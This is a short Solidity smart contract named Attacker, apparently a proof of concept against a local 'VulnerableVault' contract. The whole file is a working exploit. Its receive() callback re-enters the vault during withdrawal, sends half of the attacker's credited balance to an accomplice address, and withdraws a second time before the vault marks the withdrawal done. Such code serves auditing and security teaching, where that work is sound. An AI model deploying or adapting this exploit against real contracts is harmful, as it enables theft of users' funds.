// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public vault;
    address public accomplice;
    uint256 public attackStep;

    constructor(address _vault, address _accomplice) {
        vault = VulnerableVault(_vault);
        accomplice = _accomplice;
    }

    function attack() external payable {
        require(msg.value >= 2 ether, "Need at least 2 ether");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (attackStep == 0 && vault.balances(address(this)) > 0) {
            attackStep = 1;
            // Transfer half to accomplice, keeping balance for second withdraw
            uint256 transferAmount = vault.balances(address(this)) / 2;
            vault.transfer(accomplice, transferAmount);
            
            // Withdraw again - hasWithdrawn is still false but we still have balance!
            vault.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
